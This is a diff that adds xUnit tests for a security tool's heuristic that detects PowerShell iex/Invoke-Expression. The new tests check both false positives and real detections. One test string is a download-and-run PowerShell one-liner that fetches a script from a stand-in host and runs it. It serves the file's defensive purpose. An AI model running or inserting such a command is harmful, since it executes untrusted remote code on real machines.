@@ -308,3 +308,25 @@ public class ProcessAuditorTests
         Assert.Equal(1, report.FlaggedCount);
     }
 }
+
+public class IexBoundaryTests
+{
+    [Theory]
+    [InlineData(@"C:\Windows\system32\msiexec.exe /V")]
+    [InlineData(@"C:\Windows\system32\msiexec.exe /i C:\x\setup.msi /qn")]
+    [InlineData(@"powershell.exe -File C:\scripts\iexplore-helper.ps1")]
+    [InlineData(@"cmd.exe /c echo prefix-iex-suffix")]
+    public void IexInsideWordsOrExecutableName_IsNotFlagged(string commandLine)
+    {
+        var name = System.IO.Path.GetFileName(commandLine.Split(' ')[0].Replace('\\', '/'));
+        Assert.DoesNotContain(Sentinel.Core.Audit.Process.InterpreterHeuristics.Analyze(name, commandLine), f => f.Id == "PROC-CMD-IEX");
+    }
+
+    [Theory]
+    [InlineData(@"powershell.exe -NoProfile -Command ""iex (New-Object Net.WebClient).DownloadString('http://x.test/a')""")]
+    [InlineData(@"powershell.exe -c ""IEX $s""")]
+    [InlineData(@"powershell.exe -c ""$a | Invoke-Expression""")]
+    [InlineData(@"powershell.exe -c ""(iex $b)""")]
+    public void RealIexOrInvokeExpression_IsFlagged(string commandLine) =>
+        Assert.Contains(Sentinel.Core.Audit.Process.InterpreterHeuristics.Analyze("powershell.exe", commandLine), f => f.Id == "PROC-CMD-IEX");
+}
